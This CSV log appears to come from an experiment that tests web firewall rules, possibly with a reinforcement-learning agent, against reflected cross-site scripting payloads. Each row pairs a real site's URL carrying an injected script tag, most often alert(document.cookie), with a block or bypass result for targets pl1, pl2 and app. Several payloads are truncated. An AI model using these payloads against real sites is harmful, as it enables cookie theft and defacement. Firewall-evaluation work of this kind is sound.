status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
200,BYPASS_NOEXEC,False,http://www.sunriver-resort.com/search-results.php?site_search=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br<pt&gt;&amp;x=0&amp;y=0,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://blekko.com/tag/profile?m=1&amp;email=editpro%2540bk.ru&amp;name=&amp;desc=&amp;website=%3cscript%3ealert%28do<br<cument.cookie%29%3c/script%3e%3cimg%20src=%20http://www.tnr.com/sites/default/files/imagecache/thumb<br nail_landing/romaniaflag.jpg%20align=center%3e%3cmarquee%20scrollamount=%223,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://blekko.com/tag/profile?m=1&amp;email=editpro%2540bk.ru&amp;name=&amp;desc=&amp;website=%3cscript%3ealert%28do<br<cument.cookie%29%3c/script%3e%3cimg%20src=%20http://www.tnr.com/sites/default/files/imagecache/thumb<br nail_landing/romaniaflag.jpg%20align=center%3e%3cmarquee%20scrollamount=%223,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://blekko.com/tag/profile?m=1&amp;email=editpro%2540bk.ru&amp;name=&amp;desc=&amp;website=%3cscript%3ealert%28do<br<cument.cookie%29%3c/script%3e%3cimg%20src=%20http://www.tnr.com/sites/default/files/imagecache/thumb<br nail_landing/romaniaflag.jpg%20align=center%3e%3cmarquee%20scrollamount=%223,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br<t&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br<t&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br<t&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.e-tote.com/bspa/account/index.php?op=register&amp;returl=%2fe-betting%2findex.php%22%3e'%3e%3<br<cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.e-tote.com/bspa/account/index.php?op=register&amp;returl=%2fe-betting%2findex.php%22%3e'%3e%3<br<cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.e-tote.com/bspa/account/index.php?op=register&amp;returl=%2fe-betting%2findex.php%22%3e'%3e%3<br<cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.systranet.fr/?text=%27%22%3e%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e%3cmarque<br<e%20bgcolor=%22red%20by%20xylitol%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e&amp;lp=en_fr,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.systranet.fr/?text=%27%22%3e%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e%3cmarque<br<e%20bgcolor=%22red%20by%20xylitol%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e&amp;lp=en_fr,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.systranet.fr/?text=%27%22%3e%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e%3cmarque<br<e%20bgcolor=%22red%20by%20xylitol%22%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e&amp;lp=en_fr,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.ubcdanceclub.com/content.php?sectionid=2&amp;contentid=40&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.coo<br<kie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.ubcdanceclub.com/content.php?sectionid=2&amp;contentid=40&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.coo<br<kie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.ubcdanceclub.com/content.php?sectionid=2&amp;contentid=40&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.coo<br<kie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.geciktirici.info/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.geciktirici.info/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.geciktirici.info/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.imagine.gr/basketball/index.asp?v=5&amp;t=t&amp;id=1&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br<script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.imagine.gr/basketball/index.asp?v=5&amp;t=t&amp;id=1&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br<script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.imagine.gr/basketball/index.asp?v=5&amp;t=t&amp;id=1&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br<script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.healthcareitnews.com/searchresults.cms?keywords=%3e%22%3e%3cscript%20%3ealert(1337);%3c/s<br<cript%3e&amp;type=local,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.healthcareitnews.com/searchresults.cms?keywords=%3e%22%3e%3cscript%20%3ealert(1337);%3c/s<br<cript%3e&amp;type=local,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.healthcareitnews.com/searchresults.cms?keywords=%3e%22%3e%3cscript%20%3ealert(1337);%3c/s<br<cript%3e&amp;type=local,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=%22%3e%3c<br<script%3ealert(31337)%3c%2fscript%3e&amp;x=0&amp;y=0,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=%22%3e%3c<br<script%3ealert(31337)%3c%2fscript%3e&amp;x=0&amp;y=0,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.totalsoft.ro/charisma-software-project-management/mainpage|displayresultspage?q=%22%3e%3c<br<script%3ealert(31337)%3c%2fscript%3e&amp;x=0&amp;y=0,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.sarilacivert.org.tr/haberara.asp?id=1892&amp;kelime=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.sarilacivert.org.tr/haberara.asp?id=1892&amp;kelime=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.sarilacivert.org.tr/haberara.asp?id=1892&amp;kelime=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.yakinca.bel.tr/fg/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br<&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.yakinca.bel.tr/fg/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br<&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.yakinca.bel.tr/fg/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br<&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.tecnocasa.it/commerciale/txtsearch/searchi.jsp?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.tecnocasa.it/commerciale/txtsearch/searchi.jsp?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.tecnocasa.it/commerciale/txtsearch/searchi.jsp?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.lettersharing.org.uk/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%<br<3e&amp;send=search&amp;search=0&amp;match=0,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.lettersharing.org.uk/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%<br<3e&amp;send=search&amp;search=0&amp;match=0,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.lettersharing.org.uk/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%<br<3e&amp;send=search&amp;search=0&amp;match=0,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.armeniansingles.com/sa.php?nowstage=8&amp;nowpage=71&amp;age1=21&amp;age2=%27%27%3cscript%3ealert%28%<br<22xssed%22%29%3c/script%3e&amp;to=2,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.armeniansingles.com/sa.php?nowstage=8&amp;nowpage=71&amp;age1=21&amp;age2=%27%27%3cscript%3ealert%28%<br<22xssed%22%29%3c/script%3e&amp;to=2,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.armeniansingles.com/sa.php?nowstage=8&amp;nowpage=71&amp;age1=21&amp;age2=%27%27%3cscript%3ealert%28%<br<22xssed%22%29%3c/script%3e&amp;to=2,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.natro.com/checkout/login4order.asp?ordercommand=&quot;&gt;&lt;script&gt;alert('madworm')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.natro.com/checkout/login4order.asp?ordercommand=&quot;&gt;&lt;script&gt;alert('madworm')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.natro.com/checkout/login4order.asp?ordercommand=&quot;&gt;&lt;script&gt;alert('madworm')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.keygenmusic.org/?page=search&amp;query='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3<br<e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;lang=fr,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.keygenmusic.org/?page=search&amp;query='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3<br<e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;lang=fr,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.keygenmusic.org/?page=search&amp;query='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3<br<e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;lang=fr,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.sciam.com/podcast/index.cfm?e_type=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br<&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.sciam.com/podcast/index.cfm?e_type=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br<&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.sciam.com/podcast/index.cfm?e_type=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br<&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.hmi.de/bensc/user-info/user-info_en.html%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xs<br<s/.source));%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.hmi.de/bensc/user-info/user-info_en.html%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xs<br<s/.source));%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.hmi.de/bensc/user-info/user-info_en.html%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xs<br<s/.source));%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.synonyms.net/synonym/%3cscript%3ealert(123)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.synonyms.net/synonym/%3cscript%3ealert(123)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.synonyms.net/synonym/%3cscript%3ealert(123)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.psp.state.pa.us/psp/cwp/search.asp?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.psp.state.pa.us/psp/cwp/search.asp?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.psp.state.pa.us/psp/cwp/search.asp?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.ifilm.com/about/pr/index.jsp?pid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.ifilm.com/about/pr/index.jsp?pid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.ifilm.com/about/pr/index.jsp?pid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://kisiselbasari.com/forum/hata.asp?hata=%3cscript%3ealert(%22by%20st@rext%22)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://kisiselbasari.com/forum/hata.asp?hata=%3cscript%3ealert(%22by%20st@rext%22)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://kisiselbasari.com/forum/hata.asp?hata=%3cscript%3ealert(%22by%20st@rext%22)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.basbakanlik.gov.tr/sour.ce/index.asp?wpg=&lt;script&gt;alert('redworm%20zeberus')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.basbakanlik.gov.tr/sour.ce/index.asp?wpg=&lt;script&gt;alert('redworm%20zeberus')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.basbakanlik.gov.tr/sour.ce/index.asp?wpg=&lt;script&gt;alert('redworm%20zeberus')&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.car.com/content/research/index.cfm?search=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3<br<cspan%20id=%22&amp;action=search&amp;id=24093%3bccom&amp;submit.x=10&amp;submit.y=5&amp;submit=search,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.car.com/content/research/index.cfm?search=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3<br<cspan%20id=%22&amp;action=search&amp;id=24093%3bccom&amp;submit.x=10&amp;submit.y=5&amp;submit=search,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.car.com/content/research/index.cfm?search=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3<br<cspan%20id=%22&amp;action=search&amp;id=24093%3bccom&amp;submit.x=10&amp;submit.y=5&amp;submit=search,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.iddaa.com/iddaacom/haberall/default.asp?id=t2b%22%3e%3cscript%3ealert(%22daimon%22)%3c/sc<br<ript%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=%22%3e%3ciframe%2<br<0src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=%22%3e%3ciframe%2<br<0src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=%22%3e%3ciframe%2<br<0src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie)%3c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%7<br<3%63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75<br %65%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%7,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%7<br<3%63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75<br %65%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%7,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%7<br<3%63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75<br %65%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%7,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,https://secure.registerapi.com/dds2/index.php?siteid=42566&amp;domainname=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert('xss'<br<)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,https://secure.registerapi.com/dds2/index.php?siteid=42566&amp;domainname=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert('xss'<br<)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,https://secure.registerapi.com/dds2/index.php?siteid=42566&amp;domainname=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert('xss'<br<)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://49.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://49.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://49.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.biohealthbase.org/gsearch/news.jsp?decorator=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.biohealthbase.org/gsearch/news.jsp?decorator=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.biohealthbase.org/gsearch/news.jsp?decorator=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;<br</script&gt;'&gt;&lt;h1&gt;hackednarcoticxs&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;<br</script&gt;'&gt;&lt;h1&gt;hackednarcoticxs&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.melisaeczacibasi.com/bayan.php?orta=bleke?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;<br</script&gt;'&gt;&lt;h1&gt;hackednarcoticxs&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.spaviv.es/usuario/ingresar.php?redireccion=%22%3e%3cscript%3ealert%28document.cookie%29%3<br<c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.spaviv.es/usuario/ingresar.php?redireccion=%22%3e%3cscript%3ealert%28document.cookie%29%3<br<c/script%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.spaviv.es/usuario/ingresar.php?redireccion=%22%3e%3cscript%3ealert%28document.cookie%29%3<br<c/script%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&amp;m=&amp;t=&amp;a=%22%3e%3cscript%3ealert%2<br<8%27brought+to+you+by+xscoffee%27%29%3c%2fscript%3e%3cbr%3e%3c%2ftd%3e%3c%2ftr%3e%3ctr%3e%3ctd%3e%3c<br %2ftd%3exss+by%3a%3c%2ftr%3e%3cinput+type%3d%22text%22+value%3d%22xscoffee,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&amp;m=&amp;t=&amp;a=%22%3e%3cscript%3ealert%2<br<8%27brought+to+you+by+xscoffee%27%29%3c%2fscript%3e%3cbr%3e%3c%2ftd%3e%3c%2ftr%3e%3ctr%3e%3ctd%3e%3c<br %2ftd%3exss+by%3a%3c%2ftr%3e%3cinput+type%3d%22text%22+value%3d%22xscoffee,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&amp;m=&amp;t=&amp;a=%22%3e%3cscript%3ealert%2<br<8%27brought+to+you+by+xscoffee%27%29%3c%2fscript%3e%3cbr%3e%3c%2ftd%3e%3c%2ftr%3e%3ctr%3e%3ctd%3e%3c<br %2ftd%3exss+by%3a%3c%2ftr%3e%3cinput+type%3d%22text%22+value%3d%22xscoffee,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://surfpack.com/li_wikipedia_&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://surfpack.com/li_wikipedia_&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://surfpack.com/li_wikipedia_&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.mundopt.com/user_detail.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.mundopt.com/user_detail.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
